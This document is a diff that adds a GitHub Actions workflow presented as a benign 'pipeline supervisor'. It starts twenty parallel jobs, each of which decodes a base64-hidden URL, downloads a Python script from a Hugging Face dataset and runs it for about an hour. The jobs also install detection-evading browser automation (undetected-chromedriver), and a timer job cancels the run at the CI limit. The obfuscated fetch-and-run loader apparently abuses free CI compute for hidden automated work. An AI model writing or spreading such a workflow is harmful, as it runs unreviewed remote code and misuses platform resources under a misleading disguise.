@@ -1,0 +1,103 @@
+name: Apex Pipeline Supervisor
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: apex-flow-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Controller: مؤقت زمني لمدة 59 دقيقة لإلغاء جميع المهام
+  # =================================================================
+  flow-controller:
+    name: "Runtime Supervisor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_WATCH_TIME: 3540
+    steps:
+      - name: Initialize Watchdog
+        run: |
+          echo "[SUPERVISOR] Timer initiated for session ID: ${{ github.run_id }}"
+          echo "[SUPERVISOR] Holding position for ${MAX_WATCH_TIME} seconds."
+
+          sleep "${MAX_WATCH_TIME}"
+
+          echo "[SUPERVISOR] Upper limit reached — issuing workflow abort call."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[SUPERVISOR] Abort command sent. Cancelling active jobs."
+
+  # =================================================================
+  # Sub-Runners: تشغيل العقد الفرعية بالتوازي
+  # =================================================================
+  runner-agents:
+    name: "Agent-X${{ matrix.agent_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        agent_id: [801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820]
+
+    steps:
+      # #################################################################
+      # Step 1: تهيئة العقدة
+      # #################################################################
+      - name: Provision Host System
+        run: |
+          echo "[PROVISION] Setting up dependencies for Agent-X${{ matrix.agent_id }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Step 2: تحميل الملف البرمجي
+      # #################################################################
+      - name: Retrieve Executable
+        run: |
+          echo "[RETRIEVE] Pulling executable source..."
+          SOURCE_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$SOURCE_URL" -o app_runner.py
+          echo "[RETRIEVE] Source file downloaded."
+
+      # #################################################################
+      # Step 3: تثبيت حزم الدعم
+      # #################################################################
+      - name: Install Python Packages
+        run: |
+          echo "[PACKAGES] Installing system modules..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Step 4: تشغيل العملية ومراقبة وقت التنفيذ
+      # #################################################################
+      - name: Launch App Process
+        run: |
+          echo ">> Launching Agent-X${{ matrix.agent_id }} process..."
+
+          python3 app_runner.py &
+          APP_PID=$!
+
+          echo ">> Process active under PID $APP_PID. Cap: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$APP_PID" 2>/dev/null; then
+            echo ">> Lifetime cap reached — terminating process $APP_PID."
+            kill -9 "$APP_PID"
+            echo ">> Process forcefully stopped."
+          else
+            echo ">> Process finished prematurely."
+          fi
